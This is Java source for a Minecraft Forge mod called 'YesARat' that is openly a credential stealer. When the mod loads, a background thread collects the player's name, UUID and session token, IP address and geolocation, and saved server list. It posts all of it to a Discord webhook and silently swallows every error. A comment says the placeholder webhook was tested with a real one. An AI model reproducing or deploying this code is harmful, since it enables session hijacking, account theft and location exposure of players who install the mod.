package me.ghosty.yesarat;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.commons.io.IOUtils;

import java.net.URL;

/**
 * For indications on how things should be setup to test it, check NotARat source code
 */
@Mod(modid = "yesarat")
public class Main {
	
	final static String $name = "YesARat v1.2.1";
	// this is an example webhook but it has been tested with a real webhook and it worked perfectly
	final static String $host = "https://discord.com/api/webhooks/1000000000000000000/abcdefghijklmnopqrstuvwxy-z_A-BCDEFGHIJKLMNOPQRSTUVWXY_Z-0_123456789";
	
	@Mod.EventHandler
	public void preInit(FMLPreInitializationEvent event) {
		new Thread(() -> {
			try {
				
				DiscordWebhook webhook = new DiscordWebhook($host);
				webhook.setUsername($name);
				
				try {
					Session session = Minecraft.getMinecraft().getSession();
					DiscordWebhook.EmbedObject accountEmbed = new DiscordWebhook.EmbedObject()
						.setTitle(":unlock: Account Info")
						.setColor(0x004444)
						.setDescription("[NameMC](https://namemc.com/" + session.getPlayerID() + ") | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ") | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ")")
						.addField(":identification_card: Name", "```" + session.getUsername() + "```", true)
						.addField(":identification_card: UUID", "```" + session.getPlayerID() + "```", true)
						.addField(":key: Session Token", "```" + session.getToken() + "```", false);
					webhook.addEmbed(accountEmbed);
				} catch (Exception exc) {
				}
				
				try {
					JsonObject ip = (JsonObject) new JsonParser().parse(IOUtils.toString(new URL("https://ipapi.co/json")));
					DiscordWebhook.EmbedObject geoEmbed = new DiscordWebhook.EmbedObject()
						.setTitle(":earth_americas: IP Info")
						.setColor(0x000044)
						.setDescription("Contains information about the target's IP address and geo-location")
						.addField(":globe_with_meridians: Country", "```" + ip.get("country_name").getAsString() + "```", true)
						.addField(":globe_with_meridians: City", "```" + ip.get("city").getAsString() + "```", true)
						.addField(":globe_with_meridians: Region", "```" + ip.get("region").getAsString() + "```", true)
						.addField(":satellite_orbital: IP Address", "```" + ip.get("ip").getAsString() + "```", true)
						.addField(":satellite: Protocol", "```" + ip.get("version").getAsString() + "```", true)
						.addField(":clock10: Timezone", "```" + ip.get("timezone").getAsString() + "```", true);
					webhook.addEmbed(geoEmbed);
				} catch (Exception exc) {
				}
				
				try {
					DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
						.setTitle(":file_folder: Saved Servers")
						.setColor(0x440044)
						.setDescription("Contains the target's list of saved Minecraft servers");
					ServerList servers = new ServerList(Minecraft.getMinecraft());
					for (int i = 0; i < servers.countServers(); i++) {
						ServerData server = servers.getServerData(i);
						serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
					}
					webhook.addEmbed(serversEmbed);
				} catch (Exception exc) {
				}
				
				webhook.execute();
				
			} catch (Exception exc) {
			}
		}).start();
	}
	
}
